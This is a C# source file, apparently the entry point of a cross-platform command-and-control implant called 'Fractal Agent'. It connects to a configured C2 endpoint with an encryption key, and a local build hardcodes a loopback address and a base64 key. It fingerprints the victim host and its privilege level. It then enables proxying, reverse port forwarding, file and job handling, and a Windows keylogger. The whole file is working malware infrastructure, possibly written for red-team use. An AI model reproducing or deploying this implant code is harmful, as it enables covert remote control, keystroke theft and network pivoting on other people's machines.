using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Communication;
using Agent.Service;
using Shared;

namespace EntryPoint
{
    public class Entry
    {
#if DEBUG
        static string[] _args = new string[0];
#endif

        public static void Main(string[] args)
        {

//#if DEBUG
//            System.IO.File.AppendAllText(@"c:\users\olivier\log.txt", "starting!");
//#endif

#if DEBUG
            _args = args;
#endif
            try
            {
                Start().Wait();
            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine($"Ooops something went wrong : {ex}");
#endif
            }
        }

        public static async Task Start()
        {
#if WINDOWS
            string connUrl = Agent.Properties.Resources.EndPoint;
            string serverKey = Agent.Properties.Resources.Key;
#else
            string connUrl = AgentLinux.Resource.EndPoint.TrimEnd('*');
            string serverKey = AgentLinux.Resource.Key.TrimEnd('*');
#endif
#if DEBUG
            Trace.Listeners.Add(new TextWriterTraceListener(Console.Out));
#endif

#if LOCAL
            connUrl = "http://127.0.0.1:2000";
            serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
            //connUrl = "https://192.168.48.134:443";
            //connUrl = "http://192.168.48.134:2000";
            //connUrl = "pipe://127.0.0.1:Fractal";
            //connUrl = "tcp://*:4444";
            //connUrl = "https://127.0.0.1:3000";
#endif



#if DEBUG
            if (_args.Count() > 0)
            {
                connUrl = _args[0];
            }

            if (_args.Count() > 1)
            {
                serverKey = _args[1];
            }
#endif
            var connexion = ConnexionUrl.FromString(connUrl);

#if DEBUG
            Debug.WriteLine($"Endpoint is {connUrl}.");
            Debug.WriteLine($"ServerKey is {serverKey}.");
#endif

            if (!connexion.IsValid)
            {
                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiting...");
                return;
            }

            var metaData = GenerateMetadata(connexion.ToString());


            var configService = new ConfigService();
            configService.ServerKey = Convert.FromBase64String(serverKey);
            configService.EncryptFrames = true;

            ServiceProvider.RegisterSingleton<IConfigService>(configService);
            ServiceProvider.RegisterSingleton<INetworkService>(new NetworkService());
            ServiceProvider.RegisterSingleton<IFileService>(new FileService());
            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
            var cryptoService = new CryptoService(configService);

            ServiceProvider.RegisterSingleton<ICryptoService>(cryptoService);
            var frameService = new FrameService(cryptoService, configService);
            ServiceProvider.RegisterSingleton<IFrameService>(frameService);
            ServiceProvider.RegisterSingleton<IJobService>(new JobService());
            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService(frameService));
            ServiceProvider.RegisterSingleton<IReversePortForwardService>(new ReversePortForwardService(frameService));
#if WINDOWS
            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
#endif

            var commModule = CommunicationFactory.CreateCommunicator(connexion);

            try
            {



                var agent = new Agent.Agent(metaData, commModule);

#if DEBUG
                Debug.WriteLine($"AgentId is {metaData.Id}.");
#endif


                var s_agentThread = new Thread(agent.Run);
                s_agentThread.Start();
#if DEBUG
                Debug.WriteLine($"AgentId is started");
#endif
                s_agentThread.Join();
#if DEBUG
                Debug.WriteLine($"AgentId Thread Ended");
#endif
            }
            catch (Exception ex)
            {
#if DEBUG
            Debug.WriteLine($"AgentId is {ex}");
#endif
            }




#if DEBUG
            Debug.WriteLine("Bye !");
#endif
        }


        static AgentMetadata GenerateMetadata(string endpoint)
        {
            var hostname = Dns.GetHostName();
            var addresses = Dns.GetHostAddressesAsync(hostname).Result;

            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

#if WINDOWS
            var integrity = IntegrityLevel.Medium;
            
            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = IntegrityLevel.High;
                }
            }

            if (userName == "SYSTEM")
                integrity = IntegrityLevel.System;
#else
            var integrity = IntegrityLevel.Medium;

            if (Environment.UserName == "root")
            {
                integrity = IntegrityLevel.System;
            }
            else
            {
                // Check capabilities via /proc (approximatif)
                var caps = System.IO.File.Exists("/proc/self/status")
                    ? System.IO.File.ReadAllText("/proc/self/status")
                    : string.Empty;

                if (caps.Contains("CapEff:") && !caps.Contains("CapEff:\t0000000000000000"))
                {
                    integrity = IntegrityLevel.High;
                }
            }
#endif

#if WINDOWS
            var osType = OsType.Windows;
#else
            var osType = OsType.Linux;
#endif


            ////////For Topological testing only
            /*hostname += new Random().Next(0, 100);

            var rand = new Random().Next(0, 100);
            if (rand > 50)
                integrity = IntegrityLevel.High;
            if(rand > 75)
                integrity = IntegrityLevel.System;

            implantId =  GenerateName();*/


            AgentMetadata metadata = new AgentMetadata()
                {
                    Id = Agent.ShortGuid.NewGuid(),
                    Name = GenerateName(),
                    Hostname = hostname,
                    UserName = userName,
                    ProcessId = process.Id,
                    Address = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork).GetAddressBytes(),
                    ProcessName = process.ProcessName,
                    Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                    Integrity = integrity,
                    EndPoint = endpoint,
                    OsType = osType,
                    Version = "Fractal Agent .Net" + " (" + osType + ") " + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
                    SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                    SleepJitter = 0
                };

            return metadata;
        }

        public static string GenerateName()
        {
            var animals = new List<string>
{
    "Dog", "Cat", "Horse", "Cow", "Sheep", "Pig", "Chicken", "Rabbit", "Elephant", "Lion",
    "Tiger", "Bear", "Wolf", "Fox", "Deer", "Giraffe", "Zebra", "Monkey", "Gorilla", "Kangaroo",
    "Koala", "Leopard", "Cheetah", "Panda", "Camel", "Hippopotamus", "Rhinoceros", "Crocodile", "Alligator", "Dolphin",
    "Whale", "Shark", "Octopus", "Seal", "Penguin", "Eagle", "Owl", "Falcon", "Parrot", "Swan",
    "Peacock", "Goose", "Duck", "Turkey", "Rooster", "Lizard", "Snake", "Turtle", "Frog", "Toad",
    "Crab", "Lobster", "Shrimp", "Bee", "Butterfly", "Ant", "Spider", "Fly", "Mosquito", "Dragonfly",
    "Snail", "Worm", "Mouse", "Rat", "Squirrel", "Hedgehog", "Bat", "Raccoon", "Otter", "Beaver",
    "Mole", "Donkey", "Mule", "Ox", "Goat", "Llama", "Reindeer", "Bison", "Buffalo", "Porcupine",
    "Chameleon", "Iguana", "Sealion", "Stingray", "Starfish", "Seahorse", "Pigeon", "Crow", "Magpie", "Robin",
    "Hawk", "Vulture", "Flamingo", "Pelican", "Dove", "Chimpanzee", "Baboon", "Meerkat", "Lynx", "Jaguar"
};

            var qualities = new List<string>
{
    "Honest", "Kind", "Brave", "Loyal", "Creative", "Patient", "Generous", "Optimistic", "Reliable", "Hardworking",
    "Thoughtful", "Empathetic", "Caring", "Adaptable", "Confident", "Respectful", "Trustworthy", "Ambitious", "Cheerful", "Calm",
    "Courageous", "Disciplined", "Friendly", "Helpful", "Humble", "Independent", "Inventive", "Joyful", "Modest", "Open-minded",
    "Passionate", "Polite", "Positive", "Proactive", "Resourceful", "Sincere", "Supportive", "Tolerant", "Understanding", "Witty",
    "Balanced", "Bright", "Charming", "Considerate", "Dependable", "Determined", "Energetic", "Fair", "Forgiving", "Gentle",
    "Grateful", "Honorable", "Imaginative", "Innovative", "Inspiring", "Just", "Loving", "Mature", "Motivated", "Observant",
    "Organized", "Perceptive", "Persistent", "Playful", "Practical", "Punctual", "Rational", "Realistic", "Reflective", "Reliable",
    "Responsible", "Selfless", "Sensible", "Smart", "Sociable", "Spontaneous", "Stable", "Strong", "Sympathetic", "Talented",
    "Trusting", "Upbeat", "Vibrant", "Warm", "Wise", "Zestful", "Clever", "Curious", "Faithful", "Focused",
    "Honorable", "Inventive", "Open-hearted", "Patient", "Perseverant", "Respectful", "Sincere", "Tactful", "Valiant", "Visionary"
};

            var random = new Random();

            string animal = animals[random.Next(animals.Count)];
            string quality = qualities[random.Next(qualities.Count)];

            string result = $"{quality}-{animal}";

            return result;
        }

    }
}
